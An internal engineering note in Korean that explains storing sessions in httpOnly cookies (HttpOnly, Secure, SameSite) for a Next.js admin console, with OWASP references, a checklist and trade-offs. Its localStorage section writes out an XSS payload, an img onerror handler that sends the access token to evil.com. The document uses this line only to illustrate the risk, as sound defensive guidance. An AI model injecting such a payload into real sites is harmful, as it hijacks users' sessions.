# httpOnly 쿠키 세션

## 한 줄 정의

세션·토큰을 브라우저 JS가 접근 못 하는 **httpOnly 쿠키**에만 보관하고, `localStorage` / `sessionStorage` / `document.cookie`로는 읽을 수 없게 막는 패턴.

## 왜 필요한가

### 대안(localStorage) 깨지는 시나리오

```js
// 로그인 후
localStorage.setItem("access_token", "eyJ...");
fetch("/api/notices", {
  headers: { Authorization: `Bearer ${localStorage.getItem("access_token")}` },
});
```

한 줄짜리 XSS(예: 공지 제목에 `<img src=x onerror="fetch('https://evil.com/?t=' + localStorage.getItem('access_token'))">`)가 심어지면 공격자 서버로 토큰이 그대로 나간다. 사용자 세션 완전 탈취.

### httpOnly 쿠키

```
Set-Cookie: authjs.session-token=...; HttpOnly; Secure; SameSite=Lax; Path=/
```

- **HttpOnly** — JS에서 `document.cookie`로 읽을 수 없음. `localStorage`·extension에서도 접근 불가.
- **Secure** — HTTPS에서만 전송 (프로덕션 필수).
- **SameSite=Lax** — CSRF 1차 방어. 크로스사이트 POST에선 쿠키 안 실림.
- **브라우저가 자동으로 실어 보냄** — `fetch("/api/x", { credentials: "include" })`

XSS 있어도 쿠키 직접 읽기는 불가능. 공격자가 같은 origin에서 API 호출은 여전히 가능하지만(세션이 자동 첨부되니) — 이건 **CSRF 방어(SameSite)** + **Content Security Policy**로 막는다.

## 표준 근거

- **OWASP Session Management Cheat Sheet** — "Session cookies MUST use the `HttpOnly` and `Secure` attributes"
- **OWASP Top 10 A07:2021 — Identification and Authentication Failures** — localStorage에 세션 저장을 명시적 문제 사례로 열거
- **RFC 6265bis** (HTTP State Management) — HttpOnly 속성 표준 정의
- **Auth.js 기본 동작** — 별도 설정 없이 httpOnly 쿠키 사용

## 우리 구조에서 어디에

- **세션 관리 주체**: Auth.js (Step 9에서 도입 예정)
- **쿠키 위치**: admin-console 도메인 (Next.js 서버가 발급)
- **쿠키 이름 convention**: `authjs.session-token` (Auth.js default) 또는 `__Host-authjs.session-token` (prefix 보안 강화 원할 때)
- **브라우저 → BFF 전달**: `credentials: "include"` (`apps/admin/src/lib/api.ts`)
- **BFF → 내부 API 변환**: 쿠키에서 session 꺼내 Bearer 토큰으로 변환 (Step 9에서 `apps/admin/src/app/api/[...proxy]/route.ts`에 추가)

## CLAUDE.md 연결

CLAUDE.md "금지 패턴":
- ❌ `localStorage` / `sessionStorage`에 토큰/세션 저장 — XSS 취약
- ❌ `NEXT_PUBLIC_API_URL` — 브라우저가 API URL 몰라야 함 (BFF와 세트)

## 실무 체크리스트

- [ ] 세션 쿠키에 `HttpOnly; Secure; SameSite=Lax`
- [ ] access_token도 쿠키 아니면 JS 접근 불가 스토리지 (Auth.js는 session JWE 안에 담아 쿠키로)
- [ ] refresh_token은 더 엄격: `SameSite=Strict` 또는 `/api/auth` 경로 한정
- [ ] CSP `script-src 'self'` 이상 (inline script 막아야 XSS 최소화)
- [ ] `Secure`는 프로덕션 필수. 로컬 dev는 `Secure` 빠져도 HTTP 동작.
- [ ] 로그아웃 시 서버에서 `Set-Cookie: ...; Max-Age=0` 명시 삭제

## 대안과 trade-off

| 방식 | 보안 | 구현 복잡도 | 적합한 곳 |
|---|---|---|---|
| **httpOnly 쿠키 (우리 선택)** | 높음 (XSS 내성) | 중 (BFF 필요) | 프로덕션 어드민·내부 툴 |
| localStorage | 낮음 (XSS 취약) | 낮음 | 학습·해커톤·내부 MVP |
| sessionStorage | 낮음 | 낮음 | 위와 동일. 탭 닫으면 사라지는 것뿐 |
| In-memory (JS 변수) | 중간 | 중간 (새로고침 시 재로그인) | SPA + refresh flow 있을 때 |
| Secure Enclave / OS keychain | 최고 | 고 (모바일 네이티브) | 네이티브 앱 |

## 참고 자료

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Top 10 A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [RFC 6265bis](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)
- [Auth.js — Session Strategies](https://authjs.dev/concepts/session-strategies)
- [MDN — Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
